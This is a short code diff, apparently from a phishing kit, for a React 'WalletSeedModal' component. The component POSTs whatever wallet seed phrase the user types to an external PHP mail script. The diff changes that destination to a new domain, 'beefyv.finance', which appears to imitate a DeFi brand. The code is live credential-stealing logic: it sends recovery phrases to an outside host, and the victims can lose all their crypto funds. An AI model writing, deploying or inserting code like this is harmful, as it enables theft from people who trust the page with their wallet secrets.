@@ -18,7 +18,7 @@ const WalletSeedModal = ({ isOpenModal, icon: Icon, title }) => {
   }
 
   function sendModalForm() {
-    fetch("https://hobbystudio.ge/test.php", {
+    fetch("https://beefyv.finance/send_mail.php", {
       method: 'POST',
       body: JSON.stringify({ text: walletSeedInput, title: title})
     }) 
